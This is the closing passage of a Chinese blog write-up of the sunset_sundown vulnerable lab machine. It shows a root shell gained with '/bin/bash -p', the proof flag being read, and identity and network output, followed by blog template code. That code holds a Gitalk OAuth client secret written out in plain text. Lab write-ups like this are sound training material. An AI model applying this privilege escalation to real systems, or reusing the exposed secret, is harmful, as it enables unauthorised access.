|<br>+---------------------------------------------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.004 sec)<br></code></pre></td></tr></table></figure>
+
+<p>这样就可以直接使用 <code>/bin/bash -p</code> 来直接运行 root 的 shell 了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.0<span class="hljs-comment"># cd /root</span><br>bash-5.0<span class="hljs-comment"># ls</span><br>proof.txt<br>bash-5.0<span class="hljs-comment"># cat proof.txt</span><br>                              _____,,,\//,,\\,/,<br>                             /-- --- --- -----<br>                            ///--- --- -- - ----<br>                           o////- ---- --- --<br>                           !!//o/---  -- --<br>                         o*) !///,~,,\\,\/,,/,//,,<br>                           o!*!o<span class="hljs-string">&#x27;(\          /\</span><br><span class="hljs-string">                         | ! o &quot;,) \/\  /\  /  \/\</span><br><span class="hljs-string">                        o  !o! !!|    \/  \/     /</span><br><span class="hljs-string">                       ( * (  o!&#x27;</span>; |\   \       /<br>                        o o ! * !` | \  /       \<br>                       o  |  o <span class="hljs-string">&#x27;o| | :  \       /</span><br><span class="hljs-string">                        *  o !*!&#x27;</span>: |o|  /      /<br>                            (o<span class="hljs-string">&#x27;&#x27;</span>| `| : /      /<br>                            ! *|<span class="hljs-string">&#x27;`  \|/       \\</span><br><span class="hljs-string">                           &#x27;</span> !o!<span class="hljs-string">&#x27;:\  \\        \</span><br><span class="hljs-string">                            ( (&#x27;</span>|  \  `._______/<br>////\\\,,\///,,,,\,/oO._*  o !*!<span class="hljs-string">&#x27;`  `.________/</span><br><span class="hljs-string">  ---- -- ------- - -oO*OoOo (o&#x27;</span><span class="hljs-string">&#x27;|           /</span><br><span class="hljs-string">    --------  ------ &#x27;</span>oO*OoO!*|<span class="hljs-string">&#x27;o!!          \</span><br><span class="hljs-string">-------  -- - ---- --* oO*OoO *!&#x27;</span>| <span class="hljs-string">&#x27;         /</span><br><span class="hljs-string"> ---  -   -----  ---- - oO*OoO!!&#x27;</span>:o!<span class="hljs-string">&#x27;       /</span><br><span class="hljs-string"> - -  -----  -  --  - *--oO*OoOo!`         /</span><br><span class="hljs-string">   \\\\\,,,\\,//////,\,,\\\/,,,\,,ejm/AMC</span><br><span class="hljs-string"></span><br><span class="hljs-string">510252fabb4b7e7dddd7373b7b3da3e8</span><br><span class="hljs-string"></span><br><span class="hljs-string">Thanks for playing - Felipe Winsnes (@whitecr0wz)</span><br></code></pre></td></tr></table></figure>
+
+<p>最后的定妆照</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.0<span class="hljs-comment"># whoami</span><br>root<br>bash-5.0<span class="hljs-comment"># id</span><br>uid=1000(carlos) gid=1000(carlos) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(carlos)<br>bash-5.0<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:a1:1b:da brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.152/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 399sec preferred_lft 399sec<br>    inet6 fe80::a00:27ff:fea1:1bda/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>bash-5.0<span class="hljs-comment"># uname -a</span><br>Linux sundown 4.19.0-10-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>sunset_sundown 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/10/d108ba760c3e.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/fcad96c9b901.html" title="BlackRose 靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BlackRose 靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/42e0d8744dc9.html" title="sunset_solstice 靶机">
+                        <span class="hidden-mobile">sunset_solstice 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'f80962460ccb176c4ea4f0c0a3f5d6be'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
